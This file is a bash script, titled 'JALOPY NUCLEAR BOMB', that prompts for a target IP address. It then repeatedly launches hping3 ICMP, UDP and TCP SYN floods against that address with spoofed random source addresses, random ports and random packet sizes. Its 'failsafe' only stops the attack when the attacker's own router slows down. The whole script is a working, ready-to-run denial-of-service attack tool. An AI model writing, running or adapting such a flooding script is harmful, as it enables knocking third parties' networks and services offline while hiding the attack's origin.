#!/bin/bash

clear
echo -e "\e[1;31m======================================"
echo -e "      JALOPY NUCLEAR BOMB vFINAL SPOOF+FAILSAFE"
echo -e "======================================\e[0m"
echo ""

read -p "Enter the target IP address: " target

echo ""
echo -e "\e[1;31mLaunching unstoppable spoofed nuclear flood on $target...\e[0m"
sleep 2

# Set your router IP (your local gateway)
router_ip="192.168.1.1"

# Function to check router ping
check_router_ping() {
    ping_time=$(ping -c 1 -W 1 $router_ip | grep 'time=' | sed -n 's/.*time=\(.*\) ms/\1/p')
    ping_time=${ping_time%.*} # Remove decimal part
    if [[ -z "$ping_time" ]]; then
        ping_time=9999
    fi

    if [ "$ping_time" -ge 1000 ]; then
        echo -e "\e[1;31m[!!] Router ping $ping_time ms — FAILSAFE ACTIVATED. Killing attacks.\e[0m"
        sudo pkill hping3
        exit 1
    fi
}

while true
do
    randport1=$(( ( RANDOM % 65535 )  + 1 ))
    randport2=$(( ( RANDOM % 65535 )  + 1 ))
    randport3=$(( ( RANDOM % 65535 )  + 1 ))
    packetsize=$(( ( RANDOM % 1400 )  + 100 ))

    echo -e "\e[1;32m[*] ICMP PING FLOOD (Large Packets: ${packetsize} bytes + random source IP)\e[0m"
    sudo hping3 -1 --flood --rand-source -d $packetsize -i u50 $target &

    echo -e "\e[1;33m[*] UDP FLOOD (Random Port: $randport1 + Spoofed IP)\e[0m"
    sudo hping3 --udp --flood --rand-source -p $randport1 -d $packetsize $target &

    echo -e "\e[1;35m[*] TCP SYN FLOOD (Random Port: $randport2 + Spoofed IP)\e[0m"
    sudo hping3 -S --flood --rand-source -p $randport2 -d $packetsize $target &

    echo -e "\e[1;36m[*] SECOND UDP FLOOD (Random Port: $randport3 + Spoofed IP)\e[0m"
    sudo hping3 --udp --flood --rand-source -p $randport3 -d $packetsize -i u100 $target &

    sleep 5

    # Check router health
    check_router_ping

    sudo pkill hping3
done
